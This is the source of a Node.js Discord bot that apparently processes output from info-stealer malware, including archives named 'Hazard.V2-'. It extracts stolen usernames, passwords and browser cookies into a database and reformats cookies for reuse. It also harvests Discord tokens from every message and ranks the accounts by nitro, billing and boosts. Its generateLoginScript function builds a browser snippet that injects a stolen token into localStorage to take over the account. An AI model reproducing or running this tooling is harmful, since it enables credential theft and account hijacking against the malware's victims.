// code is shit

/*
There are a ton of random unused variables here. There is also a ton of awful decisions made when designing the code. Why? Because I'm lazy.
If you want to fix it, make a PR. Don't add me on Discord and complain. I will help when I can.
*/

// discord.js
const { Client, Intents, Collection } = require("discord.js");
const fs = require("fs");
const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
  ws: { properties: { $browser: "Discord iOS" } },
});

const config = require("./config.json");
// mysql
const con = require("./db.js");

// zip
const zip = require("jszip");

client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

const { generateEmbed } = require("./user-embed");
const { default: axios } = require("axios");

const good_domains = [
  "google.com",
  "coinbase.com",
  "discord.com",
  "discordapp.com",
  "binance.com",
  "bittrex.com",
  "bitfinex.com",
  "bitrefill.com",
  "roblox.com",
  "paypal.com",
  "amazon",
  "github.com",
  "ebay.com",
  "twitch.tv",
  "reddit.com",
  "twitter.com",
  "netflix.com",
  "origin.com",
  "steampowered.com",
  "steamcommunity.com",
  "aliexpress.com",
  "yahoo.com",
  "facebook.com",
  "protonmail.com",
  "microsoft.com",
  "minecraft.net",
  "stake.com",
  "disney",
  "tiktok.com",
  "instagram.com",
  "outlook.com",
  "telegram",
  "riotgames.com",
  "hotmail.com",
  "spotify.com",
];

/*

Interaction handlers

*/

client.commands = new Collection();
const commandFiles = fs
  .readdirSync("./commands")
  .filter((file) => file.endsWith(".js"));
for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  client.commands.set(command.data.name, command);
}

client.on("interactionCreate", async (interaction) => {
  if (interaction.isCommand()) {
    const command = client.commands.get(interaction.commandName);
    if (!command) return;
    // disable dms
    if (interaction.channel.type == "dm") {
      await interaction.reply("You can't use commands in DMs!");
      return;
    }
    // disable if not authorized
    if ((await checkAuthorization(interaction.channel.guild.id)) == false) {
      await interaction.reply("This server is not authorized to use this bot!");
      return;
    }
    const member = interaction.guild.members.cache.get(interaction.user.id);

    try {
      await command.execute(interaction);
    } catch (error) {
      console.error(error);
      await interaction.reply({
        content: "There was an error while executing this command!",
        ephemeral: true,
      });
    }
  }
});

client.on("messageCreate", async (message) => {
  const authorized = await checkAuthorization(message.guild.id);

  if (message.author === client.user) return;
  message.attachments.forEach(async (attachment) => {
    const url = attachment.url;

    if (url.endsWith(".zip") && !url.includes("Hazard.V2-")) {
      var combos = "";
      await downloadFile(url).then(async (data) => {
        zip.loadAsync(data).then(async (zip) => {
          zip.forEach((relativePath, file) => {
            console.log(relativePath);
            if (relativePath.endsWith("login.txt")) {
              const text = file.async("text");
              text.then((text) => {
                text.split("\n").forEach((line, index) => {
                  lines = text.split("\n");
                  const url = line.split("URL: ")[1];
                  if (!url) return;
                  const user = lines[index + 1].split(
                    "Username (or email): "
                  )[1];
                  const pass = lines[index + 2].split("Password: ")[1];
                  if (url && user && pass) {
                    combos += "Domain: " + url + "\n";
                    combos += "Username: " + user + "\n";
                    combos += "Password: " + pass + "\n";
                    combos += "\n";
                    console.log(combos);

                    con.query(
                      `INSERT INTO combos (username, password, domain, guildId) VALUES (?, ?, ?, ?)`,
                      [user, pass, url, message.guildId],
                      (err, result) => {
                        if (err) {
                          if (err.code == "ER_DUP_ENTRY") {
                            console.log(
                              "Duplicate " + url + ":" + user + ":" + pass
                            );
                            return;
                          }
                          console.error(err);
                        }
                        console.log(
                          "Inserted combo " + url + ":" + user + ":" + pass
                        );
                      }
                    );
                  }
                });
                console.log(combos);
                if (authorized) {
                  message.react("✅");
                  message.reply({
                    files: [
                      {
                        attachment: Buffer.from(combos),
                        name: "combos.yml",
                      },
                    ],
                  });
                }
              });
            } else {
              return;
            }
          });
        });
      });
    }

    if (url.includes("Hazard.V2-") && url.endsWith(".zip")) {
      if (authorized) {
        message.react("✅");
      }
      await downloadFile(url).then((data) => {
        zip.loadAsync(data).then((zip) => {
          zip.forEach((relativePath, file) => {
            /* 

              SCREENSHOT

            */

            if (relativePath == "Screenshot.png") {
              const buffer = file.async("nodebuffer");
              buffer.then((data) => {
                if (authorized) {
                  message.reply({
                    files: [
                      {
                        attachment: data,
                        name: "Screenshot.png",
                      },
                    ],
                  });
                }
              });
            }

            /*

              GOOGLE PASSWORDS

            */

            if (relativePath.includes("Google Passwords.txt")) {
              var yaml = "";
              const text = file.async("text");
              text.then((text) => {
                const lines = text.split("\n");
                lines.forEach((line, index) => {
                  if (line.startsWith("Domain: ")) {
                    const domain = line.replace("Domain: ", "").trim();
                    const user = lines[index + 1].replace("User: ", "").trim();
                    const pass = lines[index + 2].replace("Pass: ", "").trim();
                    con.query(
                      `INSERT INTO combos (username, password, domain, guildId) VALUES (?, ?, ?, ?)`,
                      [user, pass, domain, message.guildId],
                      (err, result) => {
                        if (err) {
                          if (err.code == "ER_DUP_ENTRY") {
                            console.log(
                              "Duplicate " + domain + ":" + user + ":" + pass
                            );
                            return;
                          }
                          console.error(err);
                        }
                        console.log(
                          "Inserted combo " + domain + ":" + user + ":" + pass
                        );
                      }
                    );

                    yaml += "Domain: " + domain + "\n";
                    yaml += "User: " + user + "\n";
                    yaml += "Pass: " + pass + "\n";
                    yaml += "\n";
                  }
                });
                if (authorized) {
                  message.reply({
                    files: [
                      {
                        attachment: Buffer.from(yaml),
                        name: "passwords.yaml",
                      },
                    ],
                  });
                }
              });
            }
          });
        });
      });
    }
    if (url.includes("passwords") && url.endsWith(".txt")) {
      if (authorized) {
        message.react("✅");
      }
      await downloadFile(url).then((buffer) => {
        buffer
          .toString()
          .split("\n")
          .forEach((line) => {
            const domain = line.split("|")[0]?.replace("URL: ", "").trim();
            const user = line.split("|")[1]?.replace("USERNAME: ", "").trim();
            const pass = line.split("|")[2]?.replace("PASSWORD: ", "").trim();

            if (domain && user && pass) {
              // insert into database
              con.query(
                "INSERT INTO `combos` (`domain`, `username`, `password` , `guildId`) VALUES (?, ?, ?, ?)",
                [domain, user, pass, message.guild.id],
                (err, result) => {
                  // ignore dup entry
                  if (err && err.code == "ER_DUP_ENTRY") {
                    console.log(
                      "Duplicate entry: " + user + ":" + pass + ":" + domain
                    );
                    return;
                  }
                  console.log(
                    "Inserted combo: " + user + ":" + pass + ":" + domain
                  );
                }
              );
            }
          });
      });
    }
    if (url.includes("cookies") && url.endsWith(".txt")) {
      const hit_id = Math.floor(1000000 + Math.random() * 900000);
      var new_cookies = "";
      await downloadFile(url).then((buffer) => {
        buffer
          .toString()
          .split("\n")
          .forEach((line) => {
            if (line.includes("COOKIES FROM:")) return;
            if (line == "" || line == undefined) return;
            if (line.startsWith("@~$~@bby")) return;

            var host = line.split("|")[0]?.replace("HOST KEY: ", "").trim();
            var name = line.split("|")[1]?.replace(" NAME: ", "").trim();
            var value = line.split("|")[2]?.replace(" VALUE: ", "").trim();

            if (host && name && value) {
              new_cookies +=
                host +
                "	" +
                "TRUE" +
                "	/" +
                "	FALSE" +
                "	2597573456	" +
                name +
                "	" +
                value +
                "\n";
            }
          });
      });
      if (authorized) {
        message.react("✅");

        if (new_cookies != "") {
          message.reply({
            files: [
              { attachment: Buffer.from(new_cookies), name: "cookies.txt" },
            ],
          });
        }
      }
    }
  });

  // find every token in the message
  tokenExtract(JSON.stringify(message)).forEach(async (token) => {
    con.query(
      "INSERT INTO `tokens` (token, guildId) VALUES (?, ?)",
      [token, message.guild.id],
      (err, result) => {
        // ignore dup entry
        if (err && err.code == "ER_DUP_ENTRY") {
          console.log("Duplicate entry: " + token);
          return;
        }
        console.log("Inserted token: " + token);
      }
    );

    pings = "";
    const embeds = await generateEmbed(token);

    if (embeds[2].hq_guild) {
      pings += await getPingRole("hq_guild", message.guild.id);
    }
    if (embeds[2].nitro) {
      pings += await getPingRole("nitro", message.guild.id);
    }
    if (embeds[2].billing) {
      pings += await getPingRole("billing", message.guild.id);
    }
    if (embeds[2].boosts) {
      pings += await getPingRole("boosts", message.guild.id);
    }

    if (authorized) {
      message.react("✅");
      message.reply({
        content: "```js\n" + generateLoginScript(token) + "```" + "\n" + pings,
        embeds: [embeds[0], embeds[1]],
      });
    }
  });
});

// returns an array of tokens found in a string
function tokenExtract(tokens) {
  // const regexes = [
  //   /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/gm,
  //   /[\w-]{24}\.[\w-]{6}\.[\w-]{107}/gm,
  // ];

  // var matches = [];

  // regexes.forEach((regex) => {
  //   matches.push(tokens.match(regex));
  // });

  // if (matches[1] != null) {
  //   for (var i = 0; i < matches[0].length; i++) {
  //     for (var j = 0; j < matches[1].length; j++) {
  //       if (matches[1][i].startsWith(matches[0][j])) {
  //         matches[0].splice(i, 2);
  //       }
  //     }
  //   }
  // }
  // matches = matches.flat();
  // matches = [...new Set(matches)];
  // matches = matches.filter((x) => x != null);

  const regex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/gm;

  var matches = tokens.match(regex);

  if (matches != null) {
    matches = [...new Set(matches)];
    matches = matches.filter((x) => x != null);
  }
  if (matches == null) {
    matches = [];
  }
  return matches;
}

function generateLoginScript(token) {
  const script =
    '(function(){window.t="REPLACE TOKEN";window.localStorage=document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;window.setInterval(() => window.localStorage.token=`"${window.t}"`); window.location.reload();})();';
  const newScript = script.replace("REPLACE TOKEN", token.replace(/\s/g, ""));
  return newScript;
}

function downloadFile(url) {
  console.log("Downloading " + url);
  const data = axios
    .get(url, { responseType: "arraybuffer" })
    .then((res) => {
      return res.data;
    })
    .catch((err) => {
      console.error(err);
    });
  return data;
}

function getPingRole(type, guild_id) {
  return new Promise((resolve, reject) => {
    con.query(
      `SELECT ${type}_role FROM guilds WHERE guild_id = ?`,
      [guild_id],
      (err, result) => {
        if (err) {
          reject(err);
        }
        if (result[0][type + "_role"]) {
          resolve("<@&" + result[0][type + "_role"] + ">");
        } else {
          resolve("");
        }
      }
    );
  });
}

function checkAuthorization(guild_id) {
  return new Promise((resolve, reject) => {
    con.query(
      `SELECT authorized FROM guilds WHERE guild_id = ?`,
      [guild_id],
      (err, result) => {
        if (result.length > 0) {
          if (result[0].authorized === 1) {
            resolve(true);
          } else {
            resolve(false);
          }
        } else {
          resolve(false);
        }
      }
    );
  });
}

client.login(config.token);
